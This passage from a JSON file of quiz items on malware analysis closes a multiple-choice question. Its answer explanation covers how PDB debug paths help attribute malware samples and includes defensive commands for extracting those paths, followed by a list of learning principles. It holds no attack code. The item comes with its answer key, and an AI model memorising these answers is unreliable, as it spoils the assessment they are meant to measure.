(unusual)\n- Multiple versions (version 13)\n- Project name: \"AIScanner\"\n```\n\n**Attribution Value:**\n\nPDB paths help link malware samples:\n```\nSample A: C:\\Users\\Dev\\Projects\\Backdoor\\Release\\backdoor.pdb\nSample B: C:\\Users\\Dev\\Projects\\Keylogger\\Release\\keylog.pdb\nSample C: C:\\Users\\Dev\\Projects\\Ransomware\\Release\\encrypt.pdb\n\nConclusion: Same developer (\"Dev\") created all three = same threat actor\n```\n\n**Why Other Options Are Wrong:**\n\n**PDB paths always fake:**\nSome APT groups fake PDB paths, but many forget to sanitize (especially lower-tier threat actors).\n\n**Source location on victim:**\nPDB path shows DEVELOPER'S machine, not victim. Malware is compiled on attacker's machine, then deployed to victim.\n\n**Always a decoy:**\nWhile possible, most PDB leaks are mistakes (developers forgetting to strip debug info).\n\n**How to Find PDB Paths:**\n```bash\nstrings malware.exe | grep -i \".pdb\"\n\n# Or using pefile (Python):\nimport pefile\npe = pefile.PE('malware.exe')\nfor entry in pe.DIRECTORY_ENTRY_DEBUG:\n    if hasattr(entry, 'entry'):\n        print(entry.entry.PdbFileName.decode())\n```",
      "question_id": "ee678710-a1a2-4bd6-8ea9-b6a856cac99c",
      "type": "multiple_choice",
      "difficulty": 3
    }
  ],
  "jim_kwik_principles": [
    "memory_hooks",
    "active_learning",
    "teach_like_im_10",
    "minimum_effective_dose",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ]
}
